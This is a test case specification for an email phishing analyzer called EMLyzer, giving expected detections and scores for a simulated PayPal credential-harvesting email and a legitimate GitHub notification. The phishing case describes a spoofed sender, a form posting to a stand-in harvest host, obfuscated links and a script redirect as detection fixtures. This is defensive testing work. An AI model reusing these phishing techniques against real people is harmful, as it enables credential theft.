# EMLyzer Test Case Specifications

## Overview

This document provides detailed specifications for all current and planned test cases in EMLyzer's accuracy validation framework. Each test case defines:
- **Threat Profile** — type of email and attack vector
- **Key Indicators** — what EMLyzer should detect
- **Expected Results** — exact scores and findings
- **Edge Cases** — boundary conditions and exceptions
- **Confidence Level** — how reliable the test is

---

## TC_001: PayPal Phishing with Credential Harvesting

### Metadata
- **ID**: TC_001
- **Filename**: phishing_sample.eml
- **Threat Type**: Phishing
- **Attack Vector**: Credential harvesting via obfuscated links and embedded form
- **Expected Risk Range**: HIGH (45–70) or CRITICAL (70–100)
- **Test Criticality**: P0 (core phishing detection)

### Email Profile

```
From: "PayPal Security" <security@paypa1-support.com>
To: victim@example.com
Subject: URGENT: Your account has been suspended - Action Required
Return-Path: <bounce@totally-different-domain.ru>
Reply-To: collect@evil-harvest.com
X-Originating-IP: 185.220.101.47
X-Campaign-ID: phish-campaign-001
Authentication-Results: spf=fail, dkim=fail, dmarc=fail
X-Mailer: PHPMailer 6.5.0
```

### Attack Vectors

| Vector | Description | Expected Detection |
|--------|-------------|-------------------|
| **Urgency** | "account has been suspended", "24 hours", "immediately", "verify your identity" | body.urgency_count ≥ 3 |
| **Credential Request** | "Please provide your credentials and credit card information" | body.credential_keyword_count ≥ 1 |
| **Phishing CTA** | "Click here to verify your account now", "verify now" | body.phishing_cta_count ≥ 2 |
| **Obfuscated Link #1** | href=http://185.220.101.47/... but text displays "www.paypal.com/verify" | body.obfuscated_links[0] detected |
| **Obfuscated Link #2** | href=http://evil-harvest.com/... but text displays "Secure Login Portal" | body.obfuscated_links[1] detected |
| **URL Shortener** | href=http://bit.ly/3xEvIlL1nk | url.is_shortener = true |
| **Direct IP URL** | http://185.220.101.47/phish/paypal/login.php | url.is_ip_address = true, risk_score ≥ 75 |
| **Embedded Form** | `<form action="http://evil-harvest.com/steal.php" ...>` | body.forms_found = 1 |
| **JavaScript** | `<script>document.location = '...'</script>` | body.js_found = true |
| **Hidden Elements** | `<p style="display:none">filler text...</p>` | body.invisible_elements > 0 |
| **Auth Failures** | SPF=fail, DKIM=fail, DMARC=fail | header findings ≥ 3 HIGH |
| **Sender Domain Typosquatting** | paypa1-support.com (l → 1) vs paypal.com | header.sender_mismatch = true |
| **Return-Path Mismatch** | Return-Path: totally-different-domain.ru | header.return_path_mismatch = true |
| **Suspicious Originating IP** | 185.220.101.47 (Tor exit node) | header.originating_ip HIGH |

### Expected Analysis Results

#### Header Analysis

```json
{
  "findings_count": 4,
  "high_count": 4,
  "findings": [
    {
      "severity": "high",
      "description": "SPF authentication failed",
      "category": "auth"
    },
    {
      "severity": "high",
      "description": "DKIM authentication failed",
      "category": "auth"
    },
    {
      "severity": "high",
      "description": "DMARC authentication failed",
      "category": "auth"
    },
    {
      "severity": "high",
      "description": "Originating IP (185.220.101.47) marked as suspicious",
      "category": "originating_ip"
    }
  ]
}
```

#### Body Analysis

```json
{
  "findings_count": 7,
  "high_count": 5,
  "urgency_count": 4,
  "phishing_cta_count": 2,
  "credential_keyword_count": 1,
  "forms_found": 1,
  "js_found": true,
  "invisible_elements": 2,
  "obfuscated_links": [
    {
      "visible_text": "Click here to verify - http://www.paypal.com/verify",
      "actual_href": "http://185.220.101.47/phish/paypal/login.php",
      "visible_domain": "www.paypal.com",
      "href_domain": "185.220.101.47"
    },
    {
      "visible_text": "Secure Login Portal",
      "actual_href": "http://evil-harvest.com/steal.php",
      "visible_domain": "evil-harvest.com (visible text)",
      "href_domain": "evil-harvest.com (actual)"
    }
  ],
  "findings": [
    { "severity": "high", "category": "text", "description": "High urgency pattern detected (4 matches)" },
    { "severity": "high", "category": "text", "description": "Phishing CTA detected (2 matches)" },
    { "severity": "high", "category": "text", "description": "Credential keywords detected (1 match)" },
    { "severity": "high", "category": "html", "description": "Obfuscated links detected (2 found)" },
    { "severity": "high", "category": "html", "description": "Embedded form detected" },
    { "severity": "high", "category": "html", "description": "JavaScript content detected" },
    { "severity": "medium", "category": "html", "description": "Hidden elements detected (2 found)" }
  ]
}
```

#### URL Analysis

```json
{
  "urls_count": 3,
  "findings_count": 5,
  "urls": [
    {
      "original_url": "http://185.220.101.47/phish/paypal/login.php",
      "host": "185.220.101.47",
      "is_ip_address": true,
      "is_shortener": false,
      "risk_score": 85,
      "findings": [
        {
          "severity": "high",
          "description": "Direct IP address (no domain name)"
        },
        {
          "severity": "high",
          "description": "IPv4 flagged as suspicious in reputation database"
        }
      ]
    },
    {
      "original_url": "http://bit.ly/3xEvIlL1nk",
      "host": "bit.ly",
      "is_shortener": true,
      "risk_score": 45,
      "findings": [
        {
          "severity": "medium",
          "description": "URL shortener detected (obfuscates true destination)"
        }
      ]
    },
    {
      "original_url": "http://evil-harvest.com/steal.php",
      "host": "evil-harvest.com",
      "is_new_domain": true,
      "risk_score": 65,
      "findings": [
        {
          "severity": "medium",
          "description": "Domain registered within last 30 days"
        },
        {
          "severity": "medium",
          "description": "Malware-related domain (if in OpenPhish/PhishTank)"
        }
      ]
    }
  ]
}
```

#### Risk Score

```json
{
  "score": 62.5,
  "label": "high",
  "label_text": "High Risk",
  "explanation": [
    "[Header/HIGH] SPF authentication failed",
    "[Header/HIGH] DKIM authentication failed",
    "[Body/HIGH] Obfuscated links (2 found)"
  ],
  "contributions": [
    {
      "module": "header",
      "raw_score": 85,
      "weighted_score": 29.75,
      "top_reasons": ["SPF/DKIM/DMARC all failed", "Suspicious originating IP"]
    },
    {
      "module": "body",
      "raw_score": 80,
      "weighted_score": 28.0,
      "top_reasons": ["Obfuscated links", "Embedded form", "Credential request"]
    },
    {
      "module": "url",
      "raw_score": 72,
      "weighted_score": 14.4,
      "top_reasons": ["Direct IP URL", "URL shortener", "New domain"]
    }
  ]
}
```

### Success Criteria

| Criterion | Threshold | Status |
|-----------|-----------|--------|
| Score ≥ 45 | PASS if HIGH or CRITICAL | **Must Pass** |
| Header HIGH findings ≥ 3 | Expected ≥ 4 (auth failures + IP) | **Must Pass** |
| Body HIGH findings ≥ 3 | Expected ≥ 5 (forms, links, CTA, credentials, JS) | **Must Pass** |
| URL Risk ≥ 65 | At least 1 URL should score 65+ | **Must Pass** |
| Obfuscated links ≥ 1 | Should detect href≠text mismatch | **Must Pass** |
| Forms found ≥ 1 | Credential harvest form detection | **Must Pass** |

### Edge Cases & Variations

#### Variation 1A: Plain Text Phishing (no HTML obfuscation)
Same content as TC_001 but only plain text body (no HTML).

**Impact**: Loses obfuscated_links and JS findings, but urgency+CTA+credentials still present.
**Expected Score**: 45–55 (still HIGH due to header failures + urgency + credentials)

#### Variation 1B: Typosquatted Domain Only (no obfuscation)
Same attack but href and visible text both point to paypa1-support.com.

**Impact**: Loses obfuscated_links, gains sender_mismatch finding.
**Expected Score**: 40–50 (relies on header auth failures + typosquatting detection)

#### Variation 1C: Authentication Spoofed (auth passes but sender fake)
Attacker uses compromised Gmail account (SPF/DKIM pass).

**Impact**: Floor rules not triggered by auth failures; must rely on phishing indicators.
**Expected Score**: 35–55 (body indicators still sufficient, but score lower than TC_001)

### Known Limitations

1. **Typosquatting Detection**: `paypa1-support.com` (l→1) not detected via fuzzy matching. Requires manual domain reputation list or advanced similarity algorithms.
   - **Current Workaround**: Relies on return-path mismatch and auth failures
   
2. **Brand Impersonation**: No logo/brand analysis. Visual impersonation (PayPal logo in HTML) not detected.
   - **Current Workaround**: Relies on domain mismatches and obfuscated links

3. **Behavioral Analysis**: No account-based detection (e.g., "PayPal would never ask for password in email").
   - **Current Workaround**: Relies on credential + urgent CTA correlation

---

## TC_002: Legitimate GitHub Notification

### Metadata
- **ID**: TC_002
- **Filename**: clean_sample.eml
- **Threat Type**: Legitimate (transactional)
- **Service**: GitHub.com
- **Expected Risk Range**: LOW (0–20)
- **Test Criticality**: P0 (false positive prevention)

### Email Profile

```
From: "GitHub" <noreply@github.com>
To: developer@example.com
Subject: [GitHub] Your pull request was merged
Return-Path: <noreply@github.com>
X-Mailer: GitHub.com
Authentication-Results: spf=pass, dkim=pass, dmarc=pass
```

### Legitimate Indicators

| Indicator | Expected Value | Rationale |
|-----------|---|---|
| **Authentication** | SPF=pass, DKIM=pass, DMARC=pass | GitHub is reputable sender |
| **Return-Path Match** | noreply@github.com = From domain | No domain mismatch |
| **Sender Domain** | github.com (known legitimate) | Public, verifiable service |
| **Content Type** | Transactional (PR merged notification) | Legitimate, verifiable action |
| **CTA Link** | https://github.com/... (HTTPS, legitimate domain) | Points to real PR page |
| **Urgency Keywords** | None (professional tone) | No artificial urgency |
| **Credential Requests** | None | No password, token, or payment requests |
| **Forms/JavaScript** | None in HTML | No embedded harvesting mechanisms |
| **Link Obfuscation** | None (text = href domain) | Visible text matches actual domain |

### Expected Analysis Results

#### Header Analysis

```json
{
  "findings_count": 0,
  "high_count": 0,
  "medium_count": 0,
  "findings": []
}
```

**Rationale**: All authentication passes, sender domain legitimate, no suspicious headers.

#### Body Analysis

```json
{
  "findings_count": 0,
  "high_count": 0,
  "urgency_count": 0,
  "phishing_cta_count": 0,
  "credential_keyword_count": 0,
  "forms_found": 0,
  "js_found": false,
  "invisible_elements": 0,
  "base64_inline_count": 0,
  "obfuscated_links": [],
  "findings": []
}
```

**Rationale**: Professional transactional tone, no phishing patterns.

#### URL Analysis

```json
{
  "urls_count": 1,
  "findings_count": 0,
  "urls": [
    {
      "original_url": "https://github.com/myorg/myrepo/pull/42",
      "host": "github.com",
      "is_ip_address": false,
      "is_shortener": false,
      "is_punycode": false,
      "is_new_domain": false,
      "https_used": true,
      "risk_score": 0,
      "findings": []
    }
  ]
}
```

**Rationale**: HTTPS, known legitimate domain (github.com), no suspicious indicators.

#### Risk Score

```json
{
  "score": 2.5,
  "label": "low",
  "label_text": "Low Risk",
  "explanation": [],
  "contributions": [
    {
      "module": "header",
      "raw_score": 0,
      "weighted_score": 0,
      "top_reasons": []
    },
    {
      "module": "body",
      "raw_score": 0,
      "weighted_score": 0,
      "top_reasons": []
    },
    {
      "module": "url",
      "raw_score": 0,
      "weighted_score": 0,
      "top_reasons": []
    }
  ]
}
```

**Rationale**: No findings in any module; score remains at minimum (could be 0 or very low default).

### Success Criteria

| Criterion | Threshold | Status |
|-----------|-----------|--------|
| Score < 20 | PASS if LOW | **Must Pass** |
| Header HIGH findings = 0 | Expected no findings | **Must Pass** |
| Body HIGH findings = 0 | Expected no findings | **Must Pass** |
| False positive for phishing | Score should NOT trigger HIGH/CRITICAL | **Must Pass** |
| Authentication validation | SPF/DKIM/DMARC should all PASS | **Must Pass** |

### Failure Scenarios

#### FP_1: Over-aggressive URL analysis
If github.com is flagged as "new domain" or URL shortener.

**Symptom**: URL analysis contributes > 0 risk_score
**Root Cause**: Domain age detection bug or hardcoded list missing github.com
**Fix**: Add github.com to known legitimate domains list

#### FP_2: Link CTA false positive
If "View the pull request" is matched by phishing CTA regex.

**Symptom**: body.phishing_cta_count > 0
**Root Cause**: Regex too broad (e.g., `\b(view|click)` catches legitimate links)
**Fix**: Refine CTA patterns to exclude transactional contexts

#### FP_3: Urgent CTA in subject
If "[GitHub]" is parsed as urgent pattern or if "pull request" matches urgency regex.

**Symptom**: body.urgency_count > 0
**Root Cause**: Subject parsed as body, or `pull` matches `pull down` urgency pattern
**Fix**: Exclude subject from urgency analysis, refine urgency patterns

---

## TC_003–TC_010 (Planned)

### TC_003: Business Email Compromise (BEC)
- **Expected**: HIGH (45–70) — no urgency but spoofed CEO
- **Focus**: Header validation, domain reputation
- **File**: bec_sample.eml (to be added)

### TC_004: Typosquatted Netflix Login
- **Expected**: HIGH (45–70) — visual similarity exploit
- **Focus**: Domain fuzzy matching, brand detection
- **File**: typosquatting_netflix.eml (to be added)

### TC_005: Sextortion Campaign
- **Expected**: HIGH (45–70) — blackmail threat
- **Focus**: NLP classification (sextortion category)
- **File**: sextortion_sample.eml (to be added)

### TC_006: Bank Account Alert (Legitimate)
- **Expected**: LOW (0–20) — urgency but legitimate
- **Focus**: Distinguish legitimate alerts from phishing
- **File**: legitimate_bank_alert.eml (to be added)

### TC_007: Malware with .EXE Attachment
- **Expected**: CRITICAL (70–100) — executable threat
- **Focus**: Attachment analysis
- **File**: malware_exe_sample.eml (to be added)

### TC_008: Macro-Enabled Document
- **Expected**: HIGH (45–70) — VBA macro risk
- **Focus**: OLE2/OOXML macro detection
- **File**: malware_macro_sample.eml (to be added)

### TC_009: Spam Newsletter
- **Expected**: MEDIUM (20–45) — bulk sender but not phishing
- **Focus**: Bulk sender detection, List-Unsubscribe
- **File**: spam_newsletter.eml (to be added)

### TC_010: Forwarded Spam
- **Expected**: MEDIUM (20–45) — indirect spam
- **Focus**: Received chain analysis
- **File**: forwarded_spam.eml (to be added)

---

## Test Case Maintenance

### When to Update a Test Case

1. **Algorithm Change**: If risk scoring algorithm changes, recalculate expected scores
2. **New Analyzer**: If a new analyzer is added (e.g., image OCR), update findings
3. **Pattern Refinement**: If phishing patterns are updated, verify test still valid
4. **Edge Case Discovery**: If a new false positive/negative is found, document in "Known Limitations"

### Version Control

Each test case should be versioned alongside the analyzer changes:

```
v0.14.0: Added homoglyph detection + LanguageTool
- TC_001: Added homoglyph findings (expected 0 for TC_001, cyrillic chars in content)
- TC_002: Unaffected

v0.15.0: Added brand reputation checking
- TC_001: Expected score may increase due to PayPal brand matching
- TC_003: New BEC test case added to measure brand spoofing detection
```

---

## Appendix: Sample Email Source

### TC_001 Full Source
See: `samples/phishing_sample.eml`

### TC_002 Full Source
See: `samples/clean_sample.eml`

---

**Last Updated**: 2026-05-20  
**Framework Version**: 1.0  
**Test Cases Defined**: 2 (TC_001, TC_002)  
**Test Cases Planned**: 8 (TC_003–TC_010)
